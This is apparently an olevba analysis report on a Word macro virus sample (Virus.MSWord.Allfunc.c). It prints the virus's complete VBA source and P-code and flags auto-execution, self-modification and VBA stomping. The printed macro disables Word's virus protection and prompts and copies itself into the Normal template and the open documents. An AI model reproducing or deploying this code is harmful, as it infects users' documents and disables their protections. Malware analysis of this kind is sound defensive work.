olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allfunc.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allfunc.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): IT
End Sub
Private Function IT()
Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate
Set TargetModule = Target.VBProject.VBComponents.Item(1).CodeModule
If TargetModule.CountOfLines = 0 Then TargetModule.AddFromString "Private Sub Document_Open()" & vbCrLf & "End Sub"
If TargetModule.CountOfLines > 0 Then
For X = 1 To TargetModule.CountOfLines
If TargetModule.Lines(X, 1) = "Private Function IT()" Then GoTo Quit
Next
End If
Set Host = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
For X = 1 To Host.CountOfLines
If Host.Lines(X, 1) = "Private Function IT()" Then GoTo Continue
Next
Continue:
TD = Host.Lines(X, 26)
For X = 1 To TargetModule.CountOfLines
If Left(TargetModule.Lines(X, 1), 4) = "Sub " Then TargetModule.ReplaceLine X, TargetModule.Lines(X, 1) & ": IT"
If Left(TargetModule.Lines(X, 1), 12) = "Private Sub " Then TargetModule.ReplaceLine X, TargetModule.Lines(X, 1) & ": IT"
Next
TargetModule.AddFromString TD
If Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Quit:
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Allfunc.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5238 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	ArgsCall IT 0x0000 
' Line #1:
' 	EndSub 
' Line #2:
' 	FuncDefn (Private Function IT(id_FFFE As Variant))
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	Ld ThisDocument 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Target 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Target 
' 	EndIf 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Target 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set TargetModule 
' Line #8:
' 	Ld TargetModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld TargetModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #9:
' 	Ld TargetModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #10:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	MemLd CountOfLines 
' 	For 
' Line #11:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0015 "Private Function IT()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Quit 
' 	EndIf 
' Line #12:
' 	StartForVariable 
' 	Next 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Host 
' Line #15:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Host 
' 	MemLd CountOfLines 
' 	For 
' Line #16:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Ld Host 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0015 "Private Function IT()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Continue 
' 	EndIf 
' Line #17:
' 	StartForVariable 
' 	Next 
' Line #18:
' 	Label Continue 
' Line #19:
' 	Ld X 
' 	LitDI2 0x001A 
' 	Ld Host 
' 	ArgsMemLd Lines 0x0002 
' 	St TD 
' Line #20:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	MemLd CountOfLines 
' 	For 
' Line #21:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0004 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0004 "Sub "
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld X 
' 	Ld X 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 ": IT"
' 	Concat 
' 	Ld TargetModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	EndIf 
' Line #22:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000C 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000C "Private Sub "
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld X 
' 	Ld X 
' 	LitDI2 0x0001 
' 	Ld TargetModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 ": IT"
' 	Concat 
' 	Ld TargetModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	EndIf 
' Line #23:
' 	StartForVariable 
' 	Next 
' Line #24:
' 	Ld TD 
' 	Ld TargetModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #25:
' 	Ld Target 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #26:
' 	Label Quit 
' Line #27:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

